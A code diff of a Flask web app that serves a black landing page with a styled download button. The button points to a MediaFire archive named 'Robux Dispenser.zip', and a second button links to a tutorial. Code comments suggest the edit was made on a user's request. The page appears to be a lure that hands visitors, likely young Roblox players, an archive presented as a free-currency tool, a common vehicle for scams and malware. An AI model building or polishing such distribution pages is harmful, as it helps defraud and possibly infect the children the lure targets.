@@ -3,10 +3,12 @@ from flask import Flask, render_template_string
 app = Flask(__name__)
 
 # External URLs
-download_url = 'https://www.example.com/your_download_site'
-tutorial_url = 'https://www.example.com/your_tutorial_site'
+# Download link provided by user
+download_url = 'https://www.mediafire.com/file/mqplxtjgqdm53ab/Robux+Dispenser.zip/file'
+# Tutorial (YouTube) link corrected
+tutorial_url = 'https://www.youtube.com'
 
-# HTML only with two centered buttons
+# HTML template: black background with styled buttons
 TEMPLATE = '''
 <!doctype html>
 <html lang="en">
@@ -14,21 +16,45 @@ TEMPLATE = '''
   <meta charset="UTF-8">
   <title>Welcome</title>
   <style>
-    html, body { height:100%; margin:0; }
-    body { display:flex; justify-content:center; align-items:center; background:#fff; }
-    a.btn {
-      padding:1em 3em;
-      font-size:1.5em;
-      margin:0 1em;
-      border:none;
-      border-radius:.5em;
-      color:#fff;
-      text-decoration:none;
-      cursor:pointer;
-      display:inline-block;
+    html, body {
+      height: 100%;
+      margin: 0;
     }
-    .download { background:#28a745; }
-    .tutorial { background:#007bff; }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+    }
+    a.btn {
+      padding: 1em 3em;
+      font-size: 1.5em;
+      margin: 0 1em;
+      border: 2px solid transparent;
+      border-radius: 0.5em;
+      color: #fff;
+      text-decoration: none;
+      cursor: pointer;
+      display: inline-block;
+      transition: background-color 0.3s, box-shadow 0.3s, border-color 0.3s;
+    }
+    .download {
+      background-color: #28a745;
+      box-shadow: 0 4px 10px rgba(40, 167, 69, 0.5);
+    }
+    .download:hover {
+      background-color: #218838;
+      box-shadow: 0 6px 15px rgba(40, 167, 69, 0.7);
+    }
+    .tutorial {
+      background-color: #007bff;
+      box-shadow: 0 4px 10px rgba(0, 123, 255, 0.5);
+    }
+    .tutorial:hover {
+      background-color: #0069d9;
+      box-shadow: 0 6px 15px rgba(0, 123, 255, 0.7);
+    }
   </style>
 </head>
 <body>
@@ -40,7 +66,11 @@ TEMPLATE = '''
 
 @app.route('/')
 def index():
-    return render_template_string(TEMPLATE, download_url=download_url, tutorial_url=tutorial_url)
+    return render_template_string(
+        TEMPLATE,
+        download_url=download_url,
+        tutorial_url=tutorial_url
+    )
 
 if __name__=='__main__':
     app.run(host='0.0.0.0', port=5000)
